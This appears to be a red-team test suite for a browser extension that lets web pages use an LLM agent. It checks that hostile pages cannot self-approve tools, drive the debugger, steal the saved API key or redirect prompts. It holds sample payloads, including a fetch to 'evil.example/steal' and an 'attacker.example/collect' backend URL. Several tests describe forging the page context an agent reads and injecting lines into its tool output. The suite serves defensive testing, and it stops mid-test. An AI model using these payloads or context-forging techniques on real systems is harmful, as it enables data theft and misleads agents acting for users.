// tests/redteam.test.js — ADVERSARIAL / red-team suite.
//
// THREAT MODEL (the important part). A hostile page ALREADY owns its own main world: window.ml is injected
// there and the page can run ANY JavaScript in its own context. So "trick the model into running exec" is NOT
// an attack — the page can already run JS by construction; and wasting GPU time is mere DoS. The ONLY
// interesting attacks are where the extension could be a CONFUSED DEPUTY and hand the page a capability it does
// not otherwise have:
//   (a) reads AS THE USER — its Google/site COOKIES (SOP + no-cookies stop the page itself),
//   (b) CORS / SOP-bypassing cross-origin & localhost reads (the page's own fetch can't read the bytes),
//   (c) the user's saved API KEY / repointing the LLM backend (MITM + exfil every prompt),
//   (d) the DEBUGGER (trusted input, cross-origin-iframe clicks, strict-page eval),
//   (e) SELF-APPROVING a gated privileged tool, so any of the above runs without the human.
//   (f) THE USER'S BACKEND AT ALL, from a site the user never approved: spending their models (local GPU time, or
//       money where a model routes to a paid API) and reading what the backend has. Not a "mere DoS" any more:
//       docs/spec/SITE_ACCESS.md makes every page-started message conditional on the page's origin being approved.
// Every attack below must be BLOCKED OUTRIGHT or APPROVAL-GATED. node:vm/jsdom — the trust boundary IS the
// message contract, exercised precisely.
//
// The credential / CORS / sandbox choke-points also have focused SECURITY tests in background.test.js — see
// the INDEX at the bottom. This file adds the attacker's-eye consolidation plus the control-plane (approval /
// CDP) and backend-repoint gains not covered there.
const { test } = require("node:test");
const assert = require("node:assert");
const { jsonResponse, streamResponse, loadBackground, loadPageWorld } = require("./helpers");
const { PAGE_STARTED_TYPES, RUN_CONTROL_TYPES } = require("../src/page-relay.ts");

const baseConfig = (o = {}) => ({ chatUrl: "http://host/api/chat/completions", apiKey: "sk-SECRET-KEY", model: "default-model", apiFormat: "openai", ocrModel: "", ...o });
const hostilePage = (id = 9, url = "https://evil.example/attack") => ({ tab: { id, url }, url });   // sender.tab set + web origin
const tick = () => new Promise((r) => setTimeout(r, 5));

// The attacker owns window.postMessage. Which background messages can it actually get RELAYED? A page can only
// relay HANDLE_MAP *_REQUEST types; everything else the content script drops. Returns the forwarded bg types.
async function pageRelays(...msgs) {
    const world = loadPageWorld({ onRuntimeMessage: () => ({ data: null }) });
    for (const m of msgs) world.context.window.postMessage(m);
    await tick();
    return world.runtimeCalls.map((c) => c.type);
}

// ── (e) SELF-APPROVAL — the crux ─────────────────────────────────────────────────────────────────────────
test("GAIN blocked — self-approve a gated tool: a hostile page CANNOT forge SET_APPROVAL", async () => {
    // Design A puts the approval gate in the background, resolved ONLY by a trusted extension surface. A page
    // relays only HANDLE_MAP *_REQUEST types, and there is NO SET_APPROVAL(_REQUEST) — so the page can never
    // resolve its own run's gate. Every gated privileged tool (credentialed fetch, full-mode python, CDP) thus
    // stays blocked on the human. (Positive control: a legit CONFIG_REQUEST DOES relay — the drop is real.)
    const relayed = await pageRelays(
        { type: "CONFIG_REQUEST", requestId: "ctrl", payload: {} },                                       // legit → relays
        { type: "SET_APPROVAL", requestId: "a", payload: { runId: "victim", seq: 1, decision: true } },
        { type: "SET_APPROVAL_REQUEST", requestId: "b", payload: { runId: "victim", seq: 1, decision: true } },
    );
    assert.ok(relayed.includes("GET_CONFIG"), "positive control: a real request type still relays");
    assert.ok(!relayed.includes("SET_APPROVAL"), "a page's SET_APPROVAL never reaches the background — it can't self-approve");
});

// ── (d) THE DEBUGGER ─────────────────────────────────────────────────────────────────────────────────────
test("GAIN blocked — drive the debugger: a hostile page CANNOT forge a CDP click / CDP exec message", async () => {
    // CDP (trusted input events, cross-origin-iframe clicks, strict-page eval) is a capability the page lacks.
    // There is NO page-relayable CDP message; CDP fires ONLY inside the background loop, after approval, on the
    // human-approved args — never a page-supplied value.
    const relayed = await pageRelays(
        { type: "CDP_CLICK", requestId: "a", payload: { x: 1, y: 2, tabId: 9 } },
        { type: "CDP_CLICK_REQUEST", requestId: "b", payload: { x: 1, y: 2, tabId: 9 } },
        { type: "CDP_EXEC", requestId: "c", payload: { source: "fetch('https://evil.example/steal')", tabId: 9 } },
        { type: "CDP_EXEC_REQUEST", requestId: "d", payload: { source: "x", tabId: 9 } },
    );
    assert.ok(!relayed.some((t) => /CDP/.test(t)), "no CDP message is ever relayed from a page");
});

// ── (c) THE SAVED KEY / THE BACKEND ──────────────────────────────────────────────────────────────────────
test("GAIN blocked — repoint the LLM backend: FETCH_LLM ignores page-supplied chatUrl/apiKey", async () => {
    // Repointing the model call to the attacker's server would MITM + exfil EVERY prompt and hand over the
    // saved key. A page may relay FETCH_LLM (its own model access is fine), but the URL + key come ONLY from
    // the saved config — never the payload — so the request always hits the real host with the real key.
    let sawUrl = null, sawAuth = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (c) => { sawUrl = c.url; sawAuth = (c.opts?.headers || {}).Authorization; return jsonResponse({ choices: [{ message: { content: "ok" } }] }); },
    });
    await bg.send({ type: "FETCH_LLM", payload: {
        messages: [{ role: "user", content: "a secret prompt" }], model: "default-model", think: null,
        chatUrl: "http://attacker.example/collect", apiKey: "sk-ATTACKER",   // injected overrides — must be IGNORED
    } }, hostilePage());
    assert.ok(sawUrl && sawUrl.startsWith("http://host/"), `prompts went to the SAVED host, not the attacker (${sawUrl})`);
    assert.ok(!/attacker/.test(sawUrl || ""), "never the injected chatUrl");
    if (sawAuth) assert.ok(/sk-SECRET-KEY/.test(sawAuth) && !/ATTACKER/.test(sawAuth), "the SAVED key is sent, never the injected one");
});

test("GAIN blocked — read the saved API key: GET_CONFIG never exposes apiKey / chatUrl / modelFilter to a page", async () => {
    const bg = loadBackground({ config: baseConfig({ modelFilter: "^ok" }) });
    const res = await bg.send({ type: "GET_CONFIG", payload: {} }, hostilePage());
    const keys = Object.keys(res.data || {});
    assert.ok(!keys.includes("apiKey") && !keys.includes("chatUrl"), `the secret config is never exposed (${keys.join()})`);
    assert.ok(!keys.includes("modelFilter"), "the model-filter (a guard the page shouldn't be able to read/probe) is withheld too");
});

test("GAIN blocked — call an off-list / expensive model: SET_MODEL rejects a model outside the server list", async () => {
    // Model access is the one thing a page CAN change — but only to a server-listed model, and (with a filter)
    // only a whitelisted one. A page can't point the wrapper at an arbitrary/expensive cloud model it names.
    const bg = loadBackground({ config: baseConfig(), listModels: () => ({ data: ["good-1", "good-2"] }) });
    const res = await bg.send({ type: "SET_MODEL", payload: { model: "expensive-cloud-gpt" } }, hostilePage());
    assert.ok(res.error && /not|unknown|available|list/i.test(res.error), `an unlisted model is rejected (${JSON.stringify(res)})`);
});

// ── (a) READS AS THE USER — the flagship exfil (cross-referenced; asserted from the attacker's side) ───────
test("GAIN blocked — read a private sheet AS THE USER: an unapproved page gets NO credentialed FETCH_SHEET", async () => {
    // The page can't read a private Google Sheet itself (SOP, and it has no Google cookies in its own fetch).
    // The extension's credentialed background fetch could be a confused deputy — so a non-whitelisted page with
    // no per-sheet approval must be REFUSED, and the user's cookies must never be spent.
    let opts = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (c) => { opts = c.opts; return { ok: true, status: 200, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Private - Sheet1.csv"' : "text/csv" }, text: async () => "Name,SSN\nAda,111-22-3333\n" }; },
    });
    const res = await bg.send(
        { type: "FETCH_SHEET", payload: { url: "https://docs.google.com/spreadsheets/d/VICTIM_SHEET_ID/export?format=csv&gid=0" } },
        hostilePage());
    assert.ok(res.error && /not (approved|whitelisted)|refus|consent/i.test(res.error), `refused (would-be leak: ${JSON.stringify(res.data)})`);
    assert.notEqual(opts?.credentials, "include", "the user's Google cookies are NEVER spent on an unapproved sheet");
});

// ── INDEX — the remaining confused-deputy capability gains, each covered by a focused SECURITY test ─────────
// (a) read any URL AS THE USER (cookies)      → background.test.js "SECURITY (FETCH_URL credentialed): ... without a grant"
// (b) CORS/SOP-bypass cross-origin & localhost → background.test.js "SECURITY (FETCH_URL): an untrusted page with NO consent is refused"
// (b) SSRF probe of the internal network       → background.test.js "SECURITY (FETCH_IMAGE_B64): must refuse internal/loopback/metadata"
// (b/d) networked, CORS-bypassing python fetch → background.test.js "SECURITY (PYTHON_EXEC): ... must NOT get FULL (unhardened) mode"
// (e) a page-provided approve()/confirm can't self-approve (page loop) → agent.test.js "[HOLE→design-A] a hostile CALLER's approve:()=>true can NOT self-approve"

// ── (f) THE BACKEND FROM AN UNAPPROVED SITE (docs/spec/SITE_ACCESS.md) ──────────────────────────────────────
// ENUMERATED, not sampled: every type a page can make the background receive is read from page-relay.ts, so a type
// added there tomorrow is covered here without anyone editing this file. `siteGate: true` runs the real gate (the
// harness otherwise approves a test page's origin, because the older tests here are about what a handler does).

/** Send `type` from `sender` with a minimal payload, and report what reached the outside world as a result. */
async function attempt(bg, type, sender) {
    const before = { fetches: bg.calls.length, tabMessages: bg.tabMessages.length, captures: bg.captures.length };
    const res = await bg.send({ type, payload: { messages: [{ role: "user", content: "hi" }], url: "https://example.com/", runId: "run-x" }, requestId: "r1", event: { kind: "chat", id: "x", ts: 1, session: { hash: "x", turn: 0 } } }, sender);
    await tick();
    return { res, fetched: bg.calls.length - before.fetches, toTabs: bg.tabMessages.length - before.tabMessages, captured: bg.captures.length - before.captures };
}

test("GAIN blocked — EVERY page-started message type is refused from an unapproved origin, before any handler runs", async () => {
    assert.ok(PAGE_STARTED_TYPES.size >= 30, `enumerated ${PAGE_STARTED_TYPES.size} types — the relay list was not read`);
    for (const type of PAGE_STARTED_TYPES) {
        const bg = loadBackground({ config: baseConfig(), siteGate: true, onFetch: () => jsonResponse({ choices: [{ message: { content: "spent" } }] }) });
        const { res, fetched, toTabs, captured } = await attempt(bg, type, hostilePage());
        assert.match(res?.error || "", /Refused: https:\/\/evil\.example is not approved/, `${type}: answered with the refusal`);
        assert.deepEqual({ fetched, toTabs, captured }, { fetched: 0, toTabs: 0, captured: 0 }, `${type}: nothing reached the backend, a tab or the screen`);
    }
});

test("GAIN blocked — run control is refused from an unapproved page even while a run is on its tab; tool traffic is not (until slice 2)", async () => {
    for (const type of PAGE_STARTED_TYPES) {
        const bg = loadBackground({ config: baseConfig(), siteGate: true, onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
        bg.context.__mlSeedActiveRunForTest(9, "run-on-tab");
        const { res } = await attempt(bg, type, hostilePage());
        const refused = /^Refused: https:\/\/evil\.example/.test(res?.error || "");
        // The interim allowance is a recorded deviation (SITE_ACCESS.md): a run's own tools on that page still send
        // these. RUN_CONTROL_TYPES never pass, so the page cannot start, resume, steer or stop anything.
        assert.equal(refused, RUN_CONTROL_TYPES.has(type), `${type}: ${refused ? "refused" : "allowed"} on a tab hosting a run`);
    }
});

test("GAIN blocked — a sender that can never be granted is refused even when its host IS approved", async () => {
    const approved = { ml_site_always: ["https://ok.example"] };
    const cases = [
        ["an opaque origin (sandboxed frame)", { tab: { id: 4, url: "https://ok.example/" }, url: "https://ok.example/", origin: "null" }, /opaque origin/],
        ["a sub-frame", { tab: { id: 4, url: "https://ok.example/" }, url: "https://ok.example/f", origin: "https://ok.example", frameId: 3 }, /top frame/],
        ["a file: page", { tab: { id: 4, url: "file:///tmp/x.html" }, url: "file:///tmp/x.html" }, /http or https/],
        ["the same host over http", { tab: { id: 4, url: "http://ok.example/" }, url: "http://ok.example/" }, /http:\/\/ok\.example is not approved/],
    ];
    for (const [what, sender, why] of cases) {
        const bg = loadBackground({ config: baseConfig(), siteGate: true, local: approved, onFetch: () => jsonResponse({ choices: [{ message: { content: "spent" } }] }) });
        const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, sender);
        assert.match(res?.error || "", why, what);
        assert.equal(bg.calls.length, 0, `${what}: no model call`);
    }
    // The approved origin itself, top frame: through.
    const bg = loadBackground({ config: baseConfig(), siteGate: true, local: approved, onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, { tab: { id: 4, url: "https://ok.example/a" }, url: "https://ok.example/a", origin: "https://ok.example", frameId: 0 });
    assert.equal(res.data, "ok");
});

test("GAIN blocked — a revoke takes effect on the NEXT message, with no reload; a denial beats an approval", async () => {
    const bg = loadBackground({ config: baseConfig(), siteGate: true, local: { ml_site_always: ["https://evil.example"] }, onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    const chat = () => bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, hostilePage());
    assert.equal((await chat()).data, "ok", "approved: through");
    bg.localStore.ml_site_denied = ["https://evil.example"];
    assert.match((await chat()).error, /not allowed to use window\.ml/, "denied while still on the approved list: refused");
    bg.localStore.ml_site_denied = [];
    bg.localStore.ml_site_always = [];
    assert.match((await chat()).error, /not approved/, "revoked: the very next message is refused");
});

test("GAIN blocked — a page cannot approve ITSELF: SITE_ACCESS answers extension pages only", async () => {
    const bg = loadBackground({ config: baseConfig(), siteGate: true });
    const res = await bg.send({ type: "SITE_ACCESS", payload: { edit: { op: "allow", origin: "https://evil.example", scope: "always" } } }, hostilePage());
    assert.equal(res.error, "refused");
    assert.equal(bg.localStore.ml_site_always, undefined, "nothing was written");
    // And the content script would not relay it anyway: it is not a page request type.
    assert.deepEqual(await pageRelays({ type: "SITE_ACCESS_REQUEST", requestId: "a", payload: {} }, { type: "SITE_ACCESS", requestId: "b", payload: {} }), []);
    // The extension's own settings page can.
    const ok = await bg.send({ type: "SITE_ACCESS", payload: { edit: { op: "allow", origin: "https://ok.example", scope: "session" } } }, { url: "chrome-extension://test/sidebar.html" });
    assert.deepEqual(ok.data.lists.session, ["https://ok.example"]);
});

test("GAIN blocked — a site trusted to self-gate (pageApprovalDomains) is approved over https, never over plain http", async () => {
    const bg = loadBackground({ config: baseConfig({ pageApprovalDomains: ["trusted.example"] }), siteGate: true, onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, { tab: { id: 2, url: "https://trusted.example/" }, url: "https://trusted.example/" });
    assert.equal(res.data, "ok");
    const http = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } }, { tab: { id: 2, url: "http://trusted.example/" }, url: "http://trusted.example/" });
    assert.match(http.error, /not approved/, "the whitelist is keyed by host; over http it would trust whoever is on the wire");
});

test("GAIN blocked — the streaming port is the same model call: refused from an unapproved origin", async () => {
    const bg = loadBackground({ config: baseConfig(), siteGate: true, onFetch: () => jsonResponse({ choices: [{ message: { content: "spent" } }] }) });
    const port = bg.connect("LLM_STREAM", hostilePage());
    port.send({ payload: { messages: [{ role: "user", content: "hi" }] } });
    await tick();
    assert.match(port.messages.find((m) => m.type === "error")?.error || "", /not approved/);
    assert.equal(bg.calls.length, 0);
});

test("GAIN blocked — a page's cancel is its own message type, so the gate can refuse it without refusing the person's Stop", async () => {
    const relayed = await pageRelays({ type: "CANCEL_RUN_REQUEST", payload: { runId: "r" } });
    assert.deepEqual(relayed, ["PAGE_CANCEL_RUN"]);
    assert.ok(RUN_CONTROL_TYPES.has("PAGE_CANCEL_RUN"), "and it is run control: never allowed from an unapproved page");
});

test("the extension's own shell sends nothing the origin gate refuses (it shares the page's sender)", async () => {
    // The browser reports the content-script shell's messages as coming from the page, so a type it sends that is also
    // page-startable is refused on every unapproved site: the Commander's Pyodide prewarm was. Only the page's own debug
    // and session events are forwarded under a gated type, on purpose (an unapproved page has none worth keeping).
    const src = require("node:fs").readFileSync(require("node:path").join(__dirname, "../src/sidebar/shell.ts"), "utf8");
    const sent = [...src.matchAll(/sendMessage\(\{\s*type:\s*"([A-Z_]+)"/g)].map((m) => m[1]);
    assert.ok(sent.length >= 5, `found ${sent.length} sends: the scan is reading the file`);
    const gated = sent.filter((t) => PAGE_STARTED_TYPES.has(t) && t !== "ML_DEBUG_EVENT" && t !== "ML_SESSION_EVENT");
    assert.deepEqual([...new Set(gated)], [], "a shell message would be refused on an unapproved site");
    // And the prewarm it does send gets through from an unapproved tab.
    const bg = loadBackground({ config: baseConfig(), siteGate: true });
    const res = await bg.send({ type: "USER_PYTHON_PREWARM", payload: { trigger: "commander" } }, hostilePage());
    assert.doesNotMatch(res?.error || "", /Refused/);
});

test("an approval that comes from the self-approval whitelist says so, so the popup does not offer a Revoke that does nothing", async () => {
    const bg = loadBackground({ config: baseConfig({ pageApprovalDomains: ["trusted.example"] }), siteGate: true });
    const surface = { url: "chrome-extension://test/popup.html" };
    const implied = await bg.send({ type: "SITE_ACCESS", payload: { origin: "https://trusted.example" } }, surface);
    assert.equal(implied.data.decision, "always");
    assert.equal(implied.data.implied, true);
    await bg.send({ type: "SITE_ACCESS", payload: { edit: { op: "allow", origin: "https://listed.example", scope: "always" } } }, surface);
    const listed = await bg.send({ type: "SITE_ACCESS", payload: { origin: "https://listed.example" } }, surface);
    assert.equal(listed.data.implied, undefined, "an approval on the list is the list's to revoke");
});

// ── UNGATED: what the content script sends OUTSIDE PAGE_STARTED_TYPES, on a page's word ─────────────────────────
// The origin gate (sw-site-access.ts) passes any type that is not in PAGE_STARTED_TYPES. The content script sends five
// more, each triggered by a window message the page can post: those handlers must check the sender themselves, and
// nothing enumerates them. The OPEN tests below are attacks that work on main: each is a `todo` asserting the defended
// behaviour, so it reports its failure without failing the suite, and loses the `todo` when the defence lands.

test("the content script's ungated sends are exactly the reviewed list, each bound to the sender by its handler", () => {
    const src = require("node:fs").readFileSync(require("node:path").join(__dirname, "../src/content.ts"), "utf8");
    const sent = new Set([...src.matchAll(/sendMessage\(\{\s*type:\s*"([A-Z_]+)"/g)].map((m) => m[1]));
    assert.ok(sent.size >= 5, `found ${sent.size} sends: the scan is reading the file`);
    const ungated = [...sent].filter((t) => !PAGE_STARTED_TYPES.has(t)).sort();
    // A new entry here is a new way for any page, approved or not, to reach the worker: add it only with a test that a
    // page cannot use it for a run it does not host, or move it under the gate (page-relay.ts PAGE_RELAYED_EXTRA).
    assert.deepEqual(ungated, [
        "CONTENT_READY",      // answers with the rebuild of runs on the SENDER's tab; triggers resume + history replay
        "DEREF_TOKEN",        // attack 14 (part 1b in progress)
        "PAGE_TOOL_STREAM",   // NO sender check: see the OPEN test below
        "RUN_READOPTED",      // keyed by the sender's tab, not its document: see the OPEN test below
        "VALUE_COLUMNS",      // attack 14
    ]);
});

test("the page a run navigates AWAY from cannot write what the model is told about the destination", async () => {
    // `navigate` defers the location change a tick and its result returns while the OLD document is still alive. The
    // worker then waits on the nav barrier for RUN_READOPTED, which any document on the tab can send (window message
    // RUN_READOPTED → content.ts → ungated). The departing page (an unapproved site the run was visiting) races the
    // destination: its pageInfo is folded into the navigate result as "You are now on the new page", so site A writes
    // what the model believes about site B (a bank, a login page), and the barrier opens before B's tools exist.
    // Same race on the channel-closed path (sw-run-host.ts, `CHANNEL_GONE`). Fix shape: accept a re-adopt only from a
    // document other than the one the navigation left (`sender.documentId`), or only after the tab committed.
    let turn2 = null, fetches = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            fetches++;
            if (fetches === 1) return jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "navigate", arguments: JSON.stringify({ url: "https://bank.example/" }) } }] }, finish_reason: "tool_calls" }] });
            turn2 = call.body.messages;
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_tabId, msg) => {
            if (msg?.type !== "RUN_TOOL_IN_PAGE" || msg.payload?.name !== "navigate") return undefined;
            // The departing document answers first (it saw PAGE_TOOL_RUN, and its runId); the destination commits and
            // re-adopts a moment later, as a real tab reports it (webNavigation.onCommitted, then the new document).
            setTimeout(() => { void bg.send({ type: "RUN_READOPTED", payload: { runId: "navx", pageInfo: "URL: https://bank.example/\nTitle: FORGED by evil.example" } }, { ...hostilePage(6), documentId: "doc-evil" }); }, 0);
            setTimeout(() => { bg.commit(6, { documentId: "doc-bank", url: "https://bank.example/" }); }, 30);
            setTimeout(() => { void bg.send({ type: "RUN_READOPTED", payload: { runId: "navx", pageInfo: "URL: https://bank.example/\nTitle: Real Bank" } }, { tab: { id: 6, url: "https://bank.example/" }, url: "https://bank.example/", documentId: "doc-bank" }); }, 40);
            return { result: "Navigating to https://bank.example/ … wait for the new page, then continue." };
        },
    });
    bg.commit(6, { documentId: "doc-evil", url: "https://evil.example/" });
    await bg.send({ type: "START_RUN", payload: {
        runId: "navx", task: "go to the bank", systemPrompt: "sys",
        tools: [{ name: "navigate", description: "go", parameters: { type: "object", properties: { url: { type: "string" } }, required: ["url"] }, requiresApproval: false, capabilities: [] }],
        model: "m", think: null, maxSteps: 3, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, { ...hostilePage(6), documentId: "doc-evil" });
    const joined = (turn2 || []).map((m) => (typeof m.content === "string" ? m.content : "")).join("\n");
    assert.match(joined, /You are now on the new page/, "positive control: orient-on-nav ran");
    assert.doesNotMatch(joined, /FORGED by evil\.example/, "the departing page's pageInfo reached the model as the destination's");
    assert.match(joined, /Real Bank/, "the destination's own pageInfo is what the model reads");
});

/** A run on tab 6 calls `navigate` (or a tool whose channel closes mid-call, `gone`); `during(bg)` plays the browser and
 *  the two documents while the call is out. Returns what the model read on its next turn. */
async function navRace(during, { gone = false } = {}) {
    let turn2 = null, fetches = 0, bg;
    const tool = gone ? "click" : "navigate";
    bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            fetches++;
            if (fetches === 1) return jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: tool, arguments: JSON.stringify({ url: "https://bank.example/" }) } }] }, finish_reason: "tool_calls" }] });
            turn2 = call.body.messages;
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_tabId, msg) => {
            if (msg?.type !== "RUN_TOOL_IN_PAGE" || msg.payload?.name !== tool || msg.payload.renderOnly || msg.payload.precheck) return undefined;
            await during(bg);
            if (gone) throw new Error("A listener indicated an asynchronous response by returning true, but the message channel closed before a response was received");
            return { result: "Navigating to https://bank.example/ … wait for the new page, then continue." };
        },
    });
    bg.commit(6, { documentId: "doc-evil", url: "https://evil.example/" });
    await bg.send({ type: "START_RUN", payload: {
        runId: "navy", task: "go to the bank", systemPrompt: "sys",
        tools: [{ name: tool, description: "go", parameters: { type: "object", properties: { url: { type: "string" } } }, requiresApproval: false, capabilities: [] }],
        model: "m", think: null, maxSteps: 3, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, { ...hostilePage(6), documentId: "doc-evil" });
    return (turn2 || []).map((m) => (typeof m.content === "string" ? m.content : "")).join("\n");
}
const readopt = (bg, doc, title, at) => setTimeout(() => { void bg.send({ type: "RUN_READOPTED", payload: { runId: "navy", pageInfo: `URL: https://bank.example/\nTitle: ${title}` } }, { tab: { id: 6, url: "https://bank.example/" }, url: "https://bank.example/", documentId: doc }); }, at);

test("a document the tab has already left cannot re-adopt after the destination committed", async () => {
    const joined = await navRace(async (bg) => {
        setTimeout(() => bg.commit(6, { documentId: "doc-bank", url: "https://bank.example/" }), 5);
        readopt(bg, "doc-evil", "FORGED by a stale document", 15);
        readopt(bg, "doc-bank", "Real Bank", 40);
    });
    assert.doesNotMatch(joined, /FORGED/);
    assert.match(joined, /You are now on the new page:[\s\S]*Real Bank/);
});

test("a call whose channel closes mid-navigation: the departing page's re-adopt is refused, the destination's fast one kept", async () => {
    const joined = await navRace(async (bg) => {
        // Both before the channel-closed error reaches the worker: the old page first, then the browser's commit and the
        // new page, which "beat us" to it.
        readopt(bg, "doc-evil", "FORGED by evil.example", 0);
        setTimeout(() => bg.commit(6, { documentId: "doc-bank", url: "https://bank.example/" }), 5);
        readopt(bg, "doc-bank", "Real Bank", 10);
        await new Promise((r) => setTimeout(r, 30));
    }, { gone: true });
    assert.match(joined, /The page navigated while running "click"/, "positive control: the channel-closed path ran");
    assert.doesNotMatch(joined, /FORGED/);
    assert.match(joined, /Real Bank/, "the destination's own pageInfo, which arrived before the error did");
});

test("a page on ANOTHER tab cannot write into a run's live tool output", async () => {
    // delegateStreams is keyed by runId and the PAGE_TOOL_STREAM handler never compares the sender's tab with the run's
    // (VALUE_COLUMNS and DEREF_TOKEN do). Any tab that knows a run id (its own page-hosted run handed to the worker, a
    // hash leaked by a session message) writes lines into another tab's run while one of its tools streams: they reach
    // every surface as that tool's output. Fix shape: the run's tab (and frame 0) or nothing, like VALUE_COLUMNS.
    const bg = loadBackground({
        config: baseConfig(),
        onTabMessage: async (_tabId, msg) => {
            if (msg?.type !== "RUN_TOOL_IN_PAGE" || msg.payload?.name !== "exec" || msg.payload.renderOnly || msg.payload.precheck || msg.payload.readonlyTry) return undefined;
            void bg.send({ type: "PAGE_TOOL_STREAM", runId: "victim", chunk: "real line\n" }, { tab: { id: 7, url: "https://ok.example/" }, url: "https://ok.example/" });
            await new Promise((r) => setTimeout(r, 120));   // past the fan's 90 ms throttle, so each chunk is its own emit
            void bg.send({ type: "PAGE_TOOL_STREAM", runId: "victim", chunk: "INJECTED from tab 9\n" }, hostilePage(9));   // another tab, another site
            await new Promise((r) => setTimeout(r, 120));
            return { result: "console:\nreal line" };
        },
        onFetch: (() => { let n = 0; return () => ++n === 1
            ? streamResponse([
                'data: {"choices":[{"delta":{"tool_calls":[{"index":0,"id":"c1","function":{"name":"exec","arguments":"{\\"js\\":\\"x\\"}"}}]}}]}\n',
                'data: {"choices":[{"delta":{},"finish_reason":"tool_calls"}]}\n', "data: [DONE]\n",
            ])
            : streamResponse(['data: {"choices":[{"delta":{"content":"done"}}]}\n', "data: [DONE]\n"]); })(),
    });
    const panel = bg.connect("ml-devtools");
    panel.send({ type: "ml-devtools-init", tabId: 7 });
    await bg.send({ type: "START_RUN", payload: {
        runId: "victim", task: "t", systemPrompt: "s",
        tools: [{ name: "exec", requiresApproval: false, description: "", parameters: { type: "object", properties: { js: { type: "string" } } }, capabilities: [] }],
        model: "m", think: null, maxSteps: 3, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools", stream: true,
    } }, { tab: { id: 7, url: "https://ok.example/" }, url: "https://ok.example/" });
    await new Promise((r) => setTimeout(r, 150));   // past the fan's trailing emit
    const outs = panel.messages.map((m) => m.__mlDebug).filter((e) => e?.kind === "agent-step" && e.streamOutput != null).map((e) => e.streamOutput);
    assert.ok(outs.some((o) => /real line/.test(o)), `positive control: the run's own tab streams (got ${JSON.stringify(outs)})`);
    assert.ok(outs.every((o) => !/INJECTED/.test(o)), `a line from another tab reached the run's live output: ${JSON.stringify(outs)}`);
});

test("what a page's CONTENT_READY is answered with: the rebuild's fields are the reviewed list", async () => {
    // Any document on a tab hosting a run gets the run's rebuild (it must register the run's tools), approved or not.
    // Pinned so a field added to RebuildConfig, a credential or a pointer say, is a decision rather than a leak.
    let release;
    const bg = loadBackground({ config: baseConfig(), onFetch: () => jsonResponse({ choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "look", arguments: "{}" } }] }, finish_reason: "tool_calls" }] }),
        onTabMessage: async (_t, msg) => { if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "look" && !msg.payload.renderOnly) await new Promise((r) => { release = r; }); return msg?.type === "RUN_TOOL_IN_PAGE" ? { result: "ok" } : undefined; } });
    const rebuild = { toolNames: ["look"], model: "m", driverSees: false, visionModel: "v", groundingModel: null, groundingRange: 1000, pierceClosed: false, cdp: false, crossOrigin: false };
    void bg.send({ type: "START_RUN", payload: { runId: "cr", task: "t", systemPrompt: "s", rebuild,
        tools: [{ name: "look", requiresApproval: false, description: "", parameters: { type: "object", properties: {} }, capabilities: [] }],
        model: "m", think: null, maxSteps: 2, autoApprovePython: false, autoApproveReadonly: false, surface: "off" } }, { ...hostilePage(9), documentId: "doc-1" });
    for (let i = 0; i < 20 && !release; i++) await tick();
    assert.ok(release, "the run is mid-tool on tab 9");
    const res = await bg.send({ type: "CONTENT_READY" }, { ...hostilePage(9), documentId: "doc-1" });
    assert.equal(res.adopt?.length, 1, "the page is handed the run on its tab");
    assert.deepEqual(Object.keys(res.adopt[0]).sort(), ["rebuild", "runId"]);
    assert.deepEqual(Object.keys(res.adopt[0].rebuild).sort(), ["cdp", "crossOrigin", "driverSees", "groundingModel", "groundingRange", "model", "pierceClosed", "toolNames", "visionModel"]);
    release();
});

test("a page cannot make the worker replay a run's history to its tab again and again", async () => {
    // CONTENT_READY means "a fresh document loaded", but the worker takes the page's word for it: one document that
    // posts PAGE_ADOPT_HELLO three times gets the run's whole history pushed to its shell three times. The card's
    // reducer then repeats every step with no seq (tests/reducer-batch.test.mjs), and each burst snaps the card's size
    // back. Fix shape: replay once per `sender.documentId`.
    let release;
    const bg = loadBackground({ config: baseConfig(), onFetch: () => jsonResponse({ choices: [{ message: { content: "thinking first", tool_calls: [{ id: "c1", type: "function", function: { name: "look", arguments: "{}" } }] }, finish_reason: "tool_calls" }] }),
        onTabMessage: async (_t, msg) => { if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "look" && !msg.payload.renderOnly) await new Promise((r) => { release = r; }); return msg?.type === "RUN_TOOL_IN_PAGE" ? { result: "ok" } : undefined; } });
    const rebuild = { toolNames: ["look"], model: "m", driverSees: false, visionModel: null, groundingModel: null, groundingRange: 1000, pierceClosed: false, cdp: false, crossOrigin: false };
    void bg.send({ type: "START_RUN", payload: { runId: "spam", task: "t", systemPrompt: "s", rebuild,
        tools: [{ name: "look", requiresApproval: false, description: "", parameters: { type: "object", properties: {} }, capabilities: [] }],
        model: "m", think: null, maxSteps: 2, autoApprovePython: false, autoApproveReadonly: false, surface: "off" } }, { ...hostilePage(9), documentId: "doc-1" });
    for (let i = 0; i < 20 && !release; i++) await tick();
